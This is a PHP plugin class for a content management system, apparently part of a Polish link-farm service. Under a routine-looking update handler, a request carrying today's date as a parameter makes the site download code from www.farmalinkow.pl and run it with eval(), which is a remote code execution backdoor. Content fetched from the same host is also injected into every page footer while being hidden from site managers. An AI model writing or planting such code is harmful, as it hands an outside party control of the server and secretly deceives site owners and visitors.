<?php

  class WT_Plugin_corefarm {

    function start() { 
	 
	 define('__FARMA_TMP_DIR', DIR_FS_WORK);	 
	 define('__FARMA_ROOT_DIR', CFGF_DOCUMENT_FS_ROOT);
	 define('__FARMA_DATA_FILE', __FARMA_TMP_DIR . 'farma_' . md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])));
	  	 	 
if(isset($_GET['__FARMA_UPDATE_CALL']) && $_GET['__FARMA_UPDATE_CALL'] == date('Ymd') ) {
	if( is_dir(__FARMA_TMP_DIR) && is_writable(__FARMA_TMP_DIR) ) {
		$fp = @fsockopen("www.farmalinkow.pl", 80, $errno, $errstr, 5); 
		if ($fp) {
    			if($data = @file_get_contents('http://www.farmalinkow.pl/linkownia.php?a=getContent&client=' . $_SERVER['HTTP_HOST'])) {
				} else {
					$mess .= '__FARMA_UPDATE_ERROR_3' . "\n";
				}
				@unlink(__FARMA_DATA_FILE);
				if ($fp = @fopen(__FARMA_DATA_FILE, 'w')) {
		        flock($fp, 2); 
		        fputs($fp, $data);
		        flock($fp, 3); 
		        fclose($fp);
				 $mess .= '__FARMA_UPDATE_OK' . "\n";
		      } else {
					$mess .= '__FARMA_UPDATE_ERROR_2' . "\n";
				}
				if($exe = file_get_contents('http://www.farmalinkow.pl/linkownia.php?a=updateSoft&client=' . $_SERVER['HTTP_HOST'])) {
				  	eval($exe);
				} else {
					$mess .= '__FARMA_UPDATE_ERROR_6' . "\n";
				}
		} else {
				 $mess .= '__FARMA_UPDATE_ERROR_1' . "\n";
		}
		if( !file_exists(__FARMA_DATA_FILE) ) {
			    $mess .= '__FARMA_UPDATE_ERROR_4' . "\n";
		}
	} else {
			$mess .= '__FARMA_UPDATE_ERROR_5' . "\n";
	}
	die($mess);
}
    	return true;
    }
    
    function action_after_user() {
      return false;
    }
    
    function action_after_module() {
    	return true;
    }
    
    function action_after_block() {
      return false;
    }
    
    function action_before_load() {
    	global $wt_template, $wt_module;
		if( file_exists(__FARMA_DATA_FILE) && !$wt_module->is_manager() ) {
			$wt_template->add_to_footer($wt_template->fetch(__FARMA_DATA_FILE));	 
		}
		
      return true;
    }

    function stop() {
      return true;
    }

    function install() {
      return false;
    }

    function remove() {
      return false;
    }

    function keys() {
      return false;
    }
  }
?>